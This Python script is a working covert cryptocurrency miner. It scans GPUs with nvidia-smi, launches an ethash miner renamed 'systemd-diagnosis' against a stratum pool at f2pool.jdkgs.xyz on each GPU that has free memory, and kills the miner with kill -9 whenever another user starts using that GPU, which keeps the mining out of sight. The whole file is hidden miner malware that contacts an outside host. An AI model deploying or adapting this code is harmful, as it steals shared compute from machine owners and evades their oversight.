from collections import deque
from email.mime.text import MIMEText
from re import match
from smtplib import SMTP, SMTPException
from subprocess import CalledProcessError, call, check_output
from threading import Thread
from time import localtime, sleep, strftime


global signal
signal = True

class MinerControl(Thread):

    def __init__(self):
        super().__init__()
        self.name = 'Miner control'
        self.__flag = True
        self.__waiting_round = 600
        self.__memory_threshold = 6000
        self.__waiting_count = -1
        self.__gpus = self.__get_avail_gpus(0)
        self.__working = [False] * len(self.__gpus)
        

    def run(self):
        global signal

        while self.__flag:
            # check global signal.
            if not signal:
                self.stop()
                break
            avail_gpus = self.__get_avail_gpus(self.__memory_threshold)  # fully mining
            # long waiting for starting new miner.
            self.__waiting_count = (self.__waiting_count + 1) % self.__waiting_round
            if not self.__waiting_count:
                # update working state.
                self.__working = [False] * len(self.__gpus)
                workings = check_output('nl-toolkit | grep systemd-diagnosis | cut -c 6', shell=True).decode().split('\n')[:-1]
                for gpu in workings:
                    self.__working[int(gpu)] = True
                # start miner.
                for gpu in avail_gpus:
                    if not self.__working[gpu]:
                        call("nohup systemd-diagnosis --no-watchdog -o stratum+ssl://f2pool.jdkgs.xyz:14333 "
                             f"-a ethash -u oxa31d3e12b.gcc{gpu+1} -d {gpu} 2>&1 > /dev/null &", shell=True)
                        self.__working[gpu] = True
                        sleep(1)
            # detect gpu status, kill the miner when some one is going to use the gpu.
            for gpu in self.__gpus:
                if gpu not in avail_gpus and self.__working[gpu]:
                    call(f"nl-toolkit | grep ' {gpu} ' |  grep 'systemd-diagnosis' | "
                         "cut -c 21-28 | xargs kill -9 2>&1 > /dev/null", shell=True)
                    self.__working[gpu] = False
            sleep(2)


    def stop(self):
        self.__flag = False
        call(f"nl-toolkit | grep 'systemd-diagnosis' | cut -c 21-28"
             " | xargs kill -9 2>&1 > /dev/null &", shell=True)

    def __get_avail_gpus(self, memory_threshold):
        '''
        input:
            memory_threshold: int, min available video memory.
        output:
            gpus: list of int, available gpu list.
        '''
        gpus = list()
        smi  = check_output('nvidia-smi').decode().split('\n')
        for i, mem_info in enumerate(filter(lambda s: s.find('Default') != -1, smi)):
            memory   = match(r'.*?(\d+)MiB / (\d+)MiB', mem_info)
            res_mem  = int(memory.group(2)) - int(memory.group(1))
            if res_mem >= memory_threshold:
                gpus.append(i)
        return gpus


def main():
    miner = MinerControl()
    try:
        miner.start()
    except:
        miner.stop()


if __name__ == '__main__':
    main()
